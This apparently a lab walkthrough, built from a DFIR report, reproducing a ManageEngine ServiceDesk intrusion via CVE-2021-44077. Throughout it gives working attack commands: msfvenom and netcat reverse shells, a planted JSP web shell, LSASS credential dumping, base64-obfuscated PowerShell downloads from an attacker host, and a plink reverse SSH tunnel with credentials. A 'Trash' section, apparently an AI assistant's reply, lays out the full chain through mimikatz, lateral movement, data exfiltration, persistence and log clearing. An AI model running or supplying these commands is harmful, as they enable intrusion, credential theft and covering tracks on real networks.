

## 1. Hands On Action: Exploiting [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) Vulnerability based on POC in [GitHub](https://github.com/horizon3ai/CVE-2021-44077)

### 1. in the POC msiexec.exe is created through `msfvenom`

   ```
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.134 LPORT=4444 -f exe > msiexec.exe
   ```

   b. run your listener

   ```
   nc -l 4444
   ```

   c. run the exploit script

   ```
   python3 exploit.py http://192.168.20.135:8080/ msiexec.exe
   ```

   ![CVE-Exploitation-Success](CVE-Exploitation-Success.png)

   #### But this approach isn't same as the report, as in the report the Threat Actor dropped a web shell jsp file `jm2.jsp` and then accessed it.
   
   ![image](https://github.com/user-attachments/assets/16c25295-6f5a-465d-96b4-da499027becb)

   #### So, i wrote a simple python Script that when executing it, a wbsh.jsp is created a the \custom\login dir
   
   ![image](https://github.com/user-attachments/assets/a0525bc4-dc65-4c9b-9856-110ae5456b23)

   
   #### then used pyinstaller to convert it to exe file

   ![image](https://github.com/user-attachments/assets/cb7515a7-7eb1-49a0-b72d-5a3e834b0348)

   #### now we got `msiexec.exe`, let's use the exploit again
   
   ![image](https://github.com/user-attachments/assets/8b473af9-46a4-4f89-9278-ff2b2c1b54b7)

   #### It Worked !!
   
   ![wbsh](https://github.com/user-attachments/assets/4c83acaf-d287-4330-9b7c-34514170a965)

   ![image](https://github.com/user-attachments/assets/55a6b0e8-78cf-46d7-ae3f-91f68353e9b8)

   #### No Need for Privilege Escalation

   ![image](https://github.com/user-attachments/assets/78176ea2-9843-480b-984c-b65e5ce7de80)

   
### 2. Next step we are enabling wdigest then dumping LSASS then downloading it

   a. is WDigest Enabled?

      
      reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
      

   ![image](https://github.com/user-attachments/assets/b6029281-dae5-4253-a7c5-8d4365bcc295)


   b. Let's Enable it

      
      Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
      
      
   ![image](https://github.com/user-attachments/assets/ac6e01e2-ab72-4ba4-928b-4a2ead73f624)

      
   c. now we got a clear plain text passwords stored at LSASS
      
      tasklist | findstr "lsass" 
      
      
   ![image](https://github.com/user-attachments/assets/58db05a4-2da0-4d51-8bdf-9671eb584c94)

   d. let's dump it
      
      C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump, 668 C:\Windows\Temp\logctl.zip full
      

   e. download it
   
   ![image](https://github.com/user-attachments/assets/6994c404-8d93-42f3-ae33-89e6cc34c703)

   f. after downloading the logctl.zip file, i'ts empty , which was weird and tried multiple ways and every time when i dump it, its empty so i had to use `procdump.exe`, i will be adding this to the lab for more fun
   
   ![image](https://github.com/user-attachments/assets/ab124bb5-bdf1-4a87-aaa8-0b53bb3d2869)

   g. download `procdump.exe`
   
      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')

   h. use `procdump.exe`
      C:\windows\temp\calc.exe -accepteula -ma 668 C:\Windows\Temp\logct2.dmp
      
   ![image](https://github.com/user-attachments/assets/78153249-ea74-4777-8430-05dc64c8c04a)

   j. Download it

   ![image](https://github.com/user-attachments/assets/e3649426-ec9b-4fd8-a3e3-0a0ce7b1acd6)


### 3. now we have the dump, we will skip the process of fetching the passwords for now, Lets Go to the next step where the attacker start tunnelling RDP connections over SSH

   a. first we will be downloading `plink.exe` as `ekern.exe`

      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')

   b. by Default RDP is Disabled let's Check first

      Get-Service -Name TermService
   
   ![image](https://github.com/user-attachments/assets/2c8d0804-16c5-4961-9e13-6179a61d723d)

   c. enable RDP but let's base64 encode this and put it in one-line command

      Set-Service -Name TermService -StartupType Automatic
      Start-Service -Name TermService
      Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name 'fDenyTSConnections' -Value 0
   
   d. Encoded:

      powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LVNlcnZpY2UgLU5hbWUgVGVybVNlcnZpY2UgLVN0YXJ0dXBUeXBlIEF1dG9tYXRpYw0KDQpTdGFydC1TZXJ2aWNlIC1OYW1lIFRlcm1TZXJ2aWNlDQoNClNldC1JdGVtUHJvcGVydHkgLVBhdGggJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlclwnIC1OYW1lICdmRGVueVRTQ29ubmVjdGlvbnMnIC1WYWx1ZSAw')) | Invoke-Expression}"
   

   e. run and now let's checkout
      
      Get-Service -Name TermService

   ![image](https://github.com/user-attachments/assets/272a554b-5da5-4103-8ec0-18ee4424299e)


   f. download Bitvise SSH Server `192.168.1.2` and configure credentials

      username: H@ck3r
      password: C@n't_D3f3nd_2021-44077

   g. let's write FXS.bat file to run `ekern.exe` and establish reverse SSH Connection to RDP

      echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l H@ck3r -pw C@n't_D3f3nd_2021-44077 -R 127.0.0.1:49800:192.168.20.145:3389 192.168.1.2

   h. another base64? no need to download it

      powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGJhdGNoQ29udGVudCA9ICdlY2hvIHl8QzpcV2luZG93c1xUZW1wXGVrZXJuLmV4ZSAtc3NoIC1QIDQ0MyAtbCBIQGNrM3IgLXB3IENAbnRfRDNmM25kXzIwMjEtNDQwNzcgLVIgMTI3LjAuMC4xOjQ5ODAwOjE5Mi4xNjguMjAuMTQ1OjMzODkgMTkyLjE2OC4xLjInDQokYmF0Y2hGaWxlUGF0aCA9ICdDOlxXaW5kb3dzXFRlbXBcRlhTLmJhdCcNClNldC1Db250ZW50IC1QYXRoICRiYXRjaEZpbGVQYXRoIC1WYWx1ZSAkYmF0Y2hDb250ZW50')) | Invoke-Expression}"
   
   ![FXS](https://github.com/user-attachments/assets/80d229df-8c50-4153-8259-807ffb44a8e7)

   j. let's run our batch now

------

# Trash

Let's proceed step by step based on the DFIR report. The report describes the attacker’s activities following the initial exploitation. Here’s what you should do next:

### Step 1: Enumerate the System

1. **Enumerate the system to gather information.**
   Run the following commands to gather basic information about the victim machine:

   ```cmd
   ipconfig /all
   systeminfo
   query user
   query session
   ```
2. **Enable WDigest Authentication**

   As mentioned previously, enabling WDigest authentication allows the attacker to later dump credentials in plaintext. Since this step failed earlier due to the key not existing, you will need to create it:

   ```cmd
   reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
   ```

### Step 2: Drop a Web Shell

Since the web shell didn't work earlier, you need to establish a more reliable reverse shell. Let's assume you now upload `nc.exe` (Netcat) and use it to create a reverse shell.

1. **Download Netcat (if not already done)**:

   ```cmd
   powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.20.134:8080/nc.exe', 'C:\windows\temp\nc.exe')"
   ```
2. **Establish a Reverse Shell**:

   On the attacker machine, set up a listener:

   ```bash
   nc -nlvp 4444
   ```

   On the victim machine, execute the reverse shell:

   ```cmd
   C:\windows\temp\nc.exe -e cmd.exe 192.168.20.134 4444
   ```

### Step 3: Periodic Enumeration

According to the report, the attacker periodically enumerated user sessions to identify high-privilege accounts.

1. **Check user sessions periodically**:

   ```cmd
   query user
   query session
   ```

### Step 4: Dump LSASS to Obtain Credentials

On the seventh day, the attacker dumped LSASS to obtain credentials. You can use a tool like `procdump.exe` or `rundll32`.

1. **Dump LSASS using `rundll32`**:

   ```cmd
   rundll32.exe C:\windows\System32\comsvcs.dll MiniDump 640 C:\windows\temp\lsass.dmp full
   ```
2. **Exfiltrate the LSASS Dump**:

   Transfer the LSASS dump file to your attacker machine:

   ```cmd
   powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.20.134:8080/lsass.dmp', 'C:\windows\temp\lsass.dmp')"
   ```

### Step 5: Analyze LSASS Dump Locally

On your attacker machine, analyze the dump file to extract credentials using tools like Mimikatz.

1. **Use Mimikatz to extract credentials**:

   ```cmd
   mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
   ```

### Step 6: Establish Reverse SSH Tunnel for RDP Access

After obtaining credentials, establish a reverse SSH tunnel for RDP access.

1. **Download and configure `plink.exe`**:

   ```cmd
   powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.20.134:8080/plink.exe', 'C:\windows\temp\plink.exe')"
   ```
2. **Establish a reverse SSH tunnel**:

   ```cmd
   C:\windows\temp\plink.exe -ssh -P 443 -l admin -pw <password> -R 3389:127.0.0.1:3389 192.168.20.134
   ```

### Step 7: Connect via RDP

Using the tunnel, connect to the victim machine via RDP.

1. **Connect to the victim machine**:

   ```bash
   rdesktop -u <username> -p <password> 127.0.0.1:3389
   ```

### Step 8: Lateral Movement

From the beachhead, perform lateral movements to other machines using the credentials obtained.

1. **Enumerate network shares and other machines**:

   ```cmd
   net view /domain
   net group "domain computers" /domain
   ```
2. **Move laterally to other machines**:

   ```cmd
   psexec.exe \\<target-machine> cmd
   ```

### Step 9: Data Exfiltration

Exfiltrate the data of interest from the targeted machines.

1. **Exfiltrate data**:

   ```cmd
   powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.20.134:8080/exfiltrated_data.zip', 'C:\path\to\data.zip')"
   ```

### Step 10: Clean Up and Persistence

Optionally, set up persistence mechanisms and clean up traces to maintain stealth.

1. **Set up persistence**:

   ```cmd
   schtasks /create /tn "UpdateTask" /tr "C:\path\to\your\backdoor.exe" /sc daily /st 12:00
   ```
2. **Clear logs**:

   ```cmd
   wevtutil cl Application
   wevtutil cl Security
   wevtutil cl System
   ```

By following these steps, you should be able to simulate the attack detailed in the DFIR report on your local network. If you encounter any further issues, feel free to ask for additional assistance.

Enumuratins
WEB SHELL:
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/browser.jsp

Download wshell.jsp command and write it to:
C:\\Program Files (x86)\\ManageEngine\\ServiceDesk\\custom\\login\\wshell.jsp

Command:
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.20.134:9000/wshell.jsp', 'C:\Program Files (x86)\ManageEngine\ServiceDesk\custom\login\wshell.jsp')"

Encoded:

powershell.exe -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG93ZXJzaGVsbCAtQ29tbWFuZCAiKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cDovLzE5Mi4xNjguMjAuMTM0OjkwMDAvd3NoZWxsLmpzcCcsICdDOlxQcm9ncmFtIEZpbGVzICh4ODYpXE1hbmFnZUVuZ2luZVxTZXJ2aWNlRGVza1xjdXN0b21cbG9naW5cd3NoZWxsLmpzcCcpIg==')) | Invoke-Expression"
